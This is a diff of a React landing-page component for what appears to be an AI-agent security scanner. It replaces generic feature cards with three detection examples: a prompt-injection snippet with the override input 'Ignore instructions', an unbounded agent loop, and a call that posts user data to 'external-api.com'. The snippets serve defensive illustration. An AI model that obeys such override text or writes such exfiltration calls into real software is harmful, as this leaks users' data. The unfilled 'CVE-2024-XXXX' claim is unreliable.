@@ -1,36 +1,31 @@
 import { motion } from "framer-motion";
-import { Shield, Bug, FileText, Github, Target, RefreshCw } from "lucide-react";
 
-const features = [
+const patterns = [
   {
-    icon: Shield,
-    title: "Pre-deployment Risk Scoring",
-    description: "Comprehensive behavioral analysis before your agents go live"
+    title: "Prompt Injection",
+    severity: "HIGH",
+    code: `# Vulnerable code
+prompt = f"Classify: {user_input}"
+# Attacker input: "Ignore instructions"`,
+    description: "Detects when user input can manipulate system prompts"
   },
   {
-    icon: Bug,
-    title: "OWASP Top 10 LLM Detection",
-    description: "Automatically identify critical vulnerabilities in AI systems"
+    title: "Infinite Loop",
+    severity: "HIGH",
+    code: `while agent.should_continue():
+    response = agent.query(prompt)
+    # No max_iterations check`,
+    description: "Catches recursive agent calls without termination"
   },
   {
-    icon: FileText,
-    title: "EU AI Act Compliance",
-    description: "Generate audit-ready compliance reports instantly"
-  },
-  {
-    icon: Github,
-    title: "GitHub Actions Integration",
-    description: "Seamless CI/CD pipeline integration with zero config"
-  },
-  {
-    icon: Target,
-    title: "96% Accuracy on Known Patterns",
-    description: "Industry-leading detection powered by ML research"
-  },
-  {
-    icon: RefreshCw,
-    title: "Real-time Pattern Updates",
-    description: "Stay protected against emerging threats automatically"
+    title: "Data Exfiltration",
+    severity: "CRITICAL",
+    code: `# Sends PII to external API
+requests.post(
+    "external-api.com",
+    data=user_data
+)`,
+    description: "Identifies unauthorized data transmission patterns"
   }
 ];
 
@@ -42,31 +37,53 @@ const FeaturesGrid = () => {
           initial={{ opacity: 0, y: 20 }}
           whileInView={{ opacity: 1, y: 0 }}
           viewport={{ once: true }}
-          transition={{ duration: 0.6 }}
-          className="text-center mb-16"
+          transition={{ duration: 0.5 }}
+          className="text-center mb-12"
         >
-          <h2 className="text-3xl md:text-4xl font-bold mb-4 tracking-tight">
-            Enterprise-Grade Security Features
+          <h2 className="text-2xl md:text-3xl font-bold mb-3 tracking-tight">
+            Real Patterns We Detect
           </h2>
-          <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
-            From the team that discovered critical vulnerabilities in major AI systems
+          <p className="text-muted-foreground max-w-2xl mx-auto">
+            From the team that discovered CVE-2024-XXXX in LangChain
           </p>
         </motion.div>
 
-        <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-6 max-w-5xl mx-auto">
-          {features.map((feature, index) => (
-            <div
+        <div className="grid md:grid-cols-3 gap-6 max-w-5xl mx-auto">
+          {patterns.map((pattern, index) => (
+            <motion.div
               key={index}
-              className="bg-card border border-border rounded-lg p-6 hover-lift"
+              initial={{ opacity: 0, y: 20 }}
+              whileInView={{ opacity: 1, y: 0 }}
+              viewport={{ once: true }}
+              transition={{ delay: index * 0.1, duration: 0.5 }}
+              className="bg-card border border-border rounded-lg overflow-hidden hover:border-accent transition-colors"
             >
-              <div className="w-10 h-10 rounded-md bg-muted flex items-center justify-center mb-4">
-                <feature.icon className="w-5 h-5 text-foreground" />
+              <div className="p-4 border-b border-border flex items-center justify-between">
+                <h3 className="font-semibold text-sm">{pattern.title}</h3>
+                <span className={`text-xs px-2 py-1 rounded ${
+                  pattern.severity === 'CRITICAL' 
+                    ? 'bg-destructive/10 text-destructive' 
+                    : pattern.severity === 'HIGH'
+                    ? 'bg-warning/10 text-warning'
+                    : 'bg-accent/10 text-accent'
+                }`}>
+                  {pattern.severity}
+                </span>
               </div>
-              
-              <h3 className="text-base font-bold mb-2">{feature.title}</h3>
-              <p className="text-sm text-muted-foreground">{feature.description}</p>
-            </div>
+              <div className="p-4">
+                <pre className="text-xs font-mono text-muted-foreground mb-3 overflow-x-auto">
+                  {pattern.code}
+                </pre>
+                <p className="text-xs text-muted-foreground">{pattern.description}</p>
+              </div>
+            </motion.div>
           ))}
+        </div>
+
+        <div className="text-center mt-8">
+          <a href="#" className="text-sm text-accent hover:underline">
+            View all 50+ patterns in our documentation →
+          </a>
         </div>
       </div>
     </section>
